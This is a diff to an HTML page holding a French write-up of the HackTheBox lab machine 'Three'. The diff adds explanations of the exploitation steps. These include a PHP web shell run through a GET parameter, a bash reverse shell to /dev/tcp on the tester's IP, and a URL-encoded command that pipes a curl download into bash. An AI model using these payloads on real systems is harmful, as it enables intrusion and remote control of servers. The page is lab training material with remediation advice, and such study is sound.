@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Three — HackTheBox | Write-up Avancé par SPECTRA MZ</title>
+<title>Three — HackTheBox | Write-up Complet par SPECTRA MZ</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -37,14 +37,10 @@
   body::before {
     content: '';
     position: fixed; inset: 0;
-    background: repeating-linear-gradient(
-      0deg, transparent, transparent 2px,
-      rgba(0,0,0,.08) 2px, rgba(0,0,0,.08) 4px
-    );
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.08) 2px, rgba(0,0,0,.08) 4px);
     pointer-events: none;
     z-index: 9999;
   }
-
   ::-webkit-scrollbar { width: 6px; height: 6px; }
   ::-webkit-scrollbar-track { background: var(--bg); }
   ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
@@ -399,9 +395,7 @@
   </div>
 
   <!-- Social share buttons -->
-  <div class="social-share" id="share-buttons">
-    <!-- They will be filled by JS -->
-  </div>
+  <div class="social-share" id="share-buttons"></div>
 
   <!-- HERO -->
   <header class="hero">
@@ -522,12 +516,27 @@ PORT   STATE SERVICE VERSION
       </pre>
     </div>
     <p>
-      Le site web (port 80) présente une page statique avec un formulaire de contact qui pointe vers <code>/action_page.php</code>, indiquant la présence de PHP. L’adresse email mentionne le domaine <code>thetoppers.htb</code>. On ajoute ce domaine dans <code>/etc/hosts</code> pour y accéder.
+      Le site web (port 80) présente une page statique avec un formulaire de contact qui pointe vers <code>/action_page.php</code>, indiquant la présence de PHP. L’adresse email mentionne le domaine <code>thetoppers.htb</code>.
+    </p>
+    <h3 class="subsection-title">Le fichier /etc/hosts</h3>
+    <div class="def-box">
+      <div class="def-term">/etc/hosts</div>
+      <div class="def-body">
+        Fichier système utilisé pour la résolution de noms de domaine localement. Il est consulté <strong>avant</strong> les serveurs DNS. Ajouter une entrée permet de forcer un nom de domaine à pointer vers une IP spécifique, indispensable lorsque le domaine n’est pas résolu publiquement ou lorsqu’on veut accéder à un vhost interne.
+      </div>
+    </div>
+    <p>On ajoute donc le domaine :</p>
+    <div class="code-wrap">
+      <div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+      <pre>echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts</pre>
+    </div>
+    <p>
+      Désormais, le navigateur résout <code>thetoppers.htb</code> vers la machine cible.
     </p>
 
-    <h3 class="subsection-title">Énumération des sous‑domaines</h3>
+    <h3 class="subsection-title">Énumération des sous‑domaines avec Gobuster</h3>
     <p>
-      On utilise <strong>gobuster</strong> en mode <code>vhost</code> pour découvrir d’éventuels sous‑domaines :
+      Les sous‑domaines permettent d’organiser des services distincts. On utilise <strong>gobuster</strong> en mode <code>vhost</code> pour les découvrir :
     </p>
     <div class="code-wrap">
       <div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
@@ -596,7 +605,7 @@ PORT   STATE SERVICE VERSION
     <h2 class="section-title">Exploitation — Upload d’un shell PHP</h2>
     <p>
       Puisque le bucket sert de webroot, on peut y télécharger un fichier PHP qui sera exécuté
-      par le serveur. On crée un shell simple :
+      par le serveur. On crée un shell simple qui utilise la fonction <code>system()</code> pour exécuter des commandes système via le paramètre GET <code>cmd</code> :
     </p>
     <div class="code-wrap">
       <div class="code-header"><span class="code-lang">PHP</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
@@ -611,6 +620,7 @@ PORT   STATE SERVICE VERSION
       On vérifie l’exécution en accédant à <code>http://thetoppers.htb/shell.php?cmd=id</code>.
       Le résultat affiche <code>uid=33(www-data)</code>, confirmant l’exécution de code.
     </p>
+    <div class="result-badge">RCE (Remote Code Execution) confirmée !</div>
   </section>
 
   <!-- SECTION 05 -->
@@ -626,6 +636,9 @@ PORT   STATE SERVICE VERSION
       <pre><span class="cmt">#!/bin/bash</span>
 bash -i >& /dev/tcp/10.10.14.32/1337 0>&1</pre>
     </div>
+    <p>
+      <strong>Explication :</strong> <code>bash -i</code> lance un shell interactif. <code>&gt;&amp; /dev/tcp/IP/PORT</code> redirige les entrées/sorties vers une socket TCP. <code>0&gt;&amp;1</code> redirige stdin vers stdout pour que les commandes fonctionnent.
+    </p>
     <p>On héberge ce fichier via un serveur HTTP Python :</p>
     <div class="code-wrap">
       <div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
@@ -643,6 +656,9 @@ bash -i >& /dev/tcp/10.10.14.32/1337 0>&1</pre>
       <div class="code-header"><span class="code-lang">URL</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
       <pre>http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.32:8000/shell.sh%7Cbash</pre>
     </div>
+    <p>
+      <strong>Détail :</strong> <code>%20</code> est l’encodage URL pour un espace, <code>%7C</code> pour le pipe <code>|</code>. La commande exécutée est : <code>curl 10.10.14.32:8000/shell.sh | bash</code>.
+    </p>
     <p>
       La victime se connecte à notre Netcat, nous donnant un shell <code>www-data</code>.
     </p>
@@ -774,6 +790,7 @@ a980d99281a28d638ac68b9bf9453c2b
       <li><strong>Isoler les services :</strong> Le bucket S3 ne devrait pas être utilisé comme répertoire web direct. Un proxy ou un cache peut éviter l’exécution de code.</li>
       <li><strong>Surveiller les accès anormaux :</strong> Mettre en place des logs détaillés sur les requêtes S3 et les appels HTTP suspects.</li>
       <li><strong>Principes du moindre privilège :</strong> L’utilisateur <code>www-data</code> ne devrait pas avoir accès au fichier <code>flag.txt</code> en dehors du webroot.</li>
+      <li><strong>Mettre à jour régulièrement :</strong> Les vulnérabilités de configuration cloud évoluent ; des audits réguliers sont nécessaires.</li>
     </ul>
   </section>
 
@@ -783,9 +800,7 @@ a980d99281a28d638ac68b9bf9453c2b
       <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
       Retour à l'accueil
     </a>
-    <div class="social-share" style="margin:0;">
-      <!-- Reuse same share buttons -->
-    </div>
+    <div class="social-share" style="margin:0;"></div>
   </div>
 
   <!-- FOOTER -->
@@ -803,7 +818,6 @@ a980d99281a28d638ac68b9bf9453c2b
 </main>
 
 <script>
-  // ─── Copy code ───
   function copyCode(btn) {
     const pre = btn.closest('.code-wrap').querySelector('pre');
     const text = pre.innerText;
@@ -883,12 +897,10 @@ a980d99281a28d638ac68b9bf9453c2b
   }
 
   function sharePage() {
-    // Trigger share buttons visibility or open native share if available
     const shareSection = document.getElementById('share-buttons');
     if (shareSection) {
       shareSection.scrollIntoView({ behavior: 'smooth' });
     }
-    // Also try native share API
     if (navigator.share) {
       navigator.share({
         title: document.title,
@@ -898,7 +910,6 @@ a980d99281a28d638ac68b9bf9453c2b
     }
   }
 
-  // Build share buttons on load
   document.addEventListener('DOMContentLoaded', buildShareButtons);
 </script>
 </body>
